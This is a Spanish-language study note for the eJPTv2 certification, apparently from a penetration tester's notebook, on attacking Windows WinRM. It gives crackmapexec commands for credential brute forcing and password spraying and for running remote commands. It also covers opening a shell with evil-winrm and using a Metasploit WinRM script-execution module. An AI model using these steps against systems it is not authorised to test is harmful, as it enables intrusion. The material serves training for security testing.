**WinRM** es el protocolo de administración remota nativo de Windows basado en el estándar WS-Management. Utiliza HTTP/HTTPS para permitir la administración de sistemas, la ejecución de scripts de PowerShell y la gestión de hardware de forma remota.

- **Puertos:** 5985 (HTTP) / 5986 (HTTPS).
- **Requisito:** Credenciales válidas de un usuario con privilegios de administración remota.
- **Protocolo de transporte:** SOAP sobre HTTP/HTTPS.

## 🛠️ Metodología de Ataque

### 1. Obtención de Credenciales y Verificación

Aunque se puede usar Hydra, la herramienta estándar de la industria para auditar WinRM es **[[Crackmapexec]] (CME)**, ya que gestiona mejor el protocolo y permite verificar privilegios rápidamente.

|**Método**|**Comando**|
|---|---|
|**Fuerza Bruta / Spraying**|`crackmapexec winrm <IP> -u <user/lista> -p <pass/lista>`|
|**Consejo eJPTv2**|Probar siempre primero con `Administrator` o `Administrador`.|

### 2. Ejecución Remota de Comandos (RCE)

Si CME devuelve la etiqueta **(Pwn3d!)**, significa que tenemos permisos administrativos y podemos ejecutar comandos directamente.

- **Comando:** `crackmapexec winrm <IP> -u <user> -p <password> -x "<comando>"`
- **Ejemplo:** `crackmapexec winrm <IP> -u Administrator -p tinkerbell -x "whoami"`

![[Imagenes/WinrmCrackmapexec.png]]
Para obtener una shell, podemos usar el script de evil-winrm
- Comando: `evil-winrm -u <user> -p '<password>' -i <IP>`

![[Imagenes/Evil-Winrm.png]]

Usando Metasploit
- Módulo: exploit/windows/winrm/winrm_script_exec
- `set RHOSTS <IP>`
- `set USERNAME <user>`
- `set PASSWORD <password>`
- Recomendable `set FORCE_VBS true` para obligar al módulo a usar un comando de Visual Basic Stager
- `exploit o run`
 
 ---
**Navegación:**
- Volver a: [[2.2 Servicios de Windows Frecuentemente Explotados]]
- Volver a: [[3.1 Explotación Vulnerabilidades de Windows]]